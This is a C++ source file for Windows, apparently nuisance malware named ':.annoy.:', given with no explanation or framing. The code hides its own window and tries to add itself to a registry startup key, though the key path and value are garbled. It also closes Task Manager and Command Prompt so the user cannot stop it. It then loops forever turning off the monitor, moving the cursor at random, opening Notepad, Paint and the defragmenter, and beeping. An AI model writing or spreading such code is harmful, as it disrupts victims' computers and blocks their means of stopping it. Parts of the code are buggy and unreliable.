#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <winable.h>
#include <conio.h>
#include <ctime>

using namespace std;

void hibernation();
void crazyMouse();
void openPrograms();
void BeepBoopBeep();

DWORD WINAPI destroyWindows(LPVOID);

int mouse[2];
int Freq, Dur;

HWND mywindow;
HWND TaskMgr;
HWND CMD;

int main()
{
    srand(time(NULL));

    HKEY hKey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Mcft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey );
    RegSetValueEx(hKey, "SetUp", 0, REG_SZ,(const unsigned char*)system, sizeof(system));
    RegCloseKey(hKey);

    CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&destroyWindows, 0, 0, NULL);

    mywindow = FindWindow(NULL,":.annoy.:");
    ShowWindow(mywindow, false);

    while(true)
    {
        hibernation();
        crazyMouse();
        openPrograms();
        BeepBoopBeep();
    }

    return 0;
}

void hibernation()
{
    Sleep(1000);
    SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) 2);
}

void crazyMouse()
{
    mouse[0] = rand() % 801;
    mouse[1] = rand() % 601;
    SetCursorPos(mouse[0], mouse[1]);
}

void openPrograms()
{
    ShellExecute(NULL, "open", "notepad.exe", NULL, NULL, SW_MAXIMIZE);
    ShellExecute(NULL, "open", "mspaint.exe", NULL, NULL, SW_MAXIMIZE);
    ShellExecute(NULL, "open", "dfrgui.exe", NULL, NULL, SW_MAXIMIZE);
}

void BeepBoopBeep()
{
    Freq = rand() % 2000;
    Dur = rand() % 287;
    Beep(Freq, Dur);
}

DWORD WINAPI destroyWindows(LPVOID)
{
    TaskMgr = FindWindow(NULL,"Windows Task Manager");
    CMD = FindWindow(NULL, "Command Prompt");

    if( TaskMgr != NULL )
    {
    SetWindowText( TaskMgr, "annoy");
    PostMessage( TaskMgr, WM_CLOSE, (LPARAM)0, (WPARAM)0);
    }

    if( CMD != NULL )
    {
    SetWindowText( CMD, "annoy");
    PostMessage( CMD, WM_CLOSE, (LPARAM)0, (WPARAM)0);
    }

    Sleep(10);
}
